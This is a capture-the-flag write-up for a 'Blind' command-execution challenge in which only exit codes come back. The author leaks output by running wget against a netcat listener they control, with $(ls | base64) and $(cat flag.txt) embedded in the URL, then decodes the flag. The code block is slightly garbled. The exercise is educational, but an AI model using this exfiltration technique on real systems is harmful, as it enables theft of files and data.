
## Blind

# The challenge:

I'm totally blind ... or am i?

Connect using nc 13.251.87.147 5002



# Writeup

We do a nc 13.251.87.147 5002.
We find a kind of bash. Testing few command (cat, ls etc...) we got in return a integer (0,1 or 127 in my test).
I did a ping www.google.fr and didn't get an answer fast. That means that the cmd are really executed.
So I opened a terminal on my computer:
    ```bash
    nc -l 8080and do a 
    ```
and on the challenge :
```bash
    wget http://X.X.X.X:8080?$(ls | base64)
```

we can capture on our terminal the request with the result of the ls command. There is a file flag.txt.
so, I did wget http://93.8.152.202:8080?$(cat flag.txt)

we got : YXhhY3RmezN4MXRfYzBkM180cjNfdmVyeV9wMHczcmZ1bGxfN2gxbmc1fQo=
so axactf{3x1t_c0d3_4r3_very_p0w3rfull_7h1ng5}.


